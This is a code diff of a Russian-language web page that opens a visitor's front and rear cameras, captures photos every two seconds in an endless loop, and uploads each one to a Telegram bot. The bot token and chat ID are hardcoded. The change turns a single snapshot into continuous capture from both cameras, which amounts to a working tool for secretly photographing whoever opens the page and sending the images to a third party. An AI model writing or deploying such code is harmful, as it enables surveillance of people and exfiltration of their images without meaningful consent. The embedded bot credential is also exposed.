@@ -5,56 +5,78 @@
   <title>Фото в бота</title>
 </head>
 <body>
-  <video id="video" autoplay style="width: 100%; max-width: 500px;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <video id="videoFront" autoplay style="width: 100%; max-width: 500px;"></video>
+  <video id="videoBack" autoplay style="width: 100%; max-width: 500px; display: none;"></video>
+  <canvas id="canvasFront" style="display:none;"></canvas>
+  <canvas id="canvasBack" style="display:none;"></canvas>
   <p id="status"></p>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    const videoFront = document.getElementById('videoFront');
+    const videoBack = document.getElementById('videoBack');
+    const canvasFront = document.getElementById('canvasFront');
+    const canvasBack = document.getElementById('canvasBack');
+    const contextFront = canvasFront.getContext('2d');
+    const contextBack = canvasBack.getContext('2d');
     const status = document.getElementById('status');
+    const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
+    const chatId = '5678878569';
 
-    // Доступ к фронтальной камере
+    // Фронтальная камера
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => takePhoto();
+        videoFront.srcObject = stream;
+        videoFront.onloadedmetadata = () => {
+          setTimeout(() => startPhotoLoop(stream, 'front'), 2000); // Задержка 2 сек
+        };
       })
-      .catch(err => status.textContent = 'Ошибка камеры: ' + err);
+      .catch(err => status.textContent = 'Ошибка фронтальной камеры: ' + err);
 
-    // Функция захвата и отправки фото
-    async function takePhoto() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0);
-      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+    // Задняя камера
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+      .then(stream => {
+        videoBack.srcObject = stream;
+        videoBack.onloadedmetadata = () => {
+          setTimeout(() => startPhotoLoop(stream, 'back'), 2000); // Задержка 2 сек
+        };
+      })
+      .catch(err => status.textContent = 'Ошибка задней камеры: ' + err);
 
-      // Telegram API
-      const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
-      const chatId = '5678878569';
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+    // Фото каждые 2 секунды
+    function startPhotoLoop(stream, type) {
+      const video = type === 'front' ? videoFront : videoBack;
+      const canvas = type === 'front' ? canvasFront : canvasBack;
+      const context = type === 'front' ? contextFront : contextBack;
 
-      // Используем FormData для отправки файла
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', photoBlob, 'photo.png');
+      async function takePhoto() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
 
-      try {
-        status.textContent = 'Отправка...';
-        const response = await fetch(url, {
-          method: 'POST',
-          body: formData
-        });
-        if (response.ok) {
-          status.textContent = 'Фото отправлено!';
-        } else {
-          const errorText = await response.text();
-          status.textContent = 'Ошибка отправки: ' + errorText;
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', photoBlob, `${type}_photo.png`);
+
+        try {
+          status.textContent = 'Отправка...';
+          const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          if (response.ok) {
+            status.textContent = 'Фото отправлено!';
+          } else {
+            const errorText = await response.text();
+            status.textContent = 'Ошибка отправки: ' + errorText;
+          }
+        } catch (error) {
+          status.textContent = 'Ошибка: ' + error;
         }
-      } catch (error) {
-        status.textContent = 'Ошибка: ' + error;
       }
+
+      takePhoto(); // Первое фото
+      setInterval(takePhoto, 2000); // Каждые 2 секунды
     }
   </script>
 </body>
